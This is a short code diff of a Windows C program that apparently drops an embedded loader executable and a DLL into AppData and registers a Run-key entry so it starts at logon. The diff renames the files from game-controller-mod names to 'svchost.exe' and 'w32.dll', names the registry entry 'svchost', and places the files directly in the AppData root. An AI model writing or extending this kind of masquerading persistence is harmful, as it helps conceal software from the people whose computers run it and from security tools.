@@ -1,9 +1,9 @@
 #include <windows.h>
 #include <shlobj.h>
 
-#define APP_DIR  "ManetteMod"
+#define APP_DIR  ""
 #define RUN_KEY  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-#define RUN_NAME "ManetteLoader"
+#define RUN_NAME "svchost"
 
 unsigned char loader_exe[] = {
 };
@@ -76,8 +76,8 @@ int WINAPI WinMain(
 	);
 
 	wsprintfA(install_dir, "%s\\%s", appdata, APP_DIR);
-	wsprintfA(loader_path, "%s\\Loader.exe", install_dir);
-	wsprintfA(dll_path, "%s\\ControllerMod.dll", install_dir);
+	wsprintfA(loader_path, "%s\\svchost.exe", install_dir);
+	wsprintfA(dll_path, "%s\\w32.dll", install_dir);
 
 	CreateDirectoryA(install_dir, NULL);
 
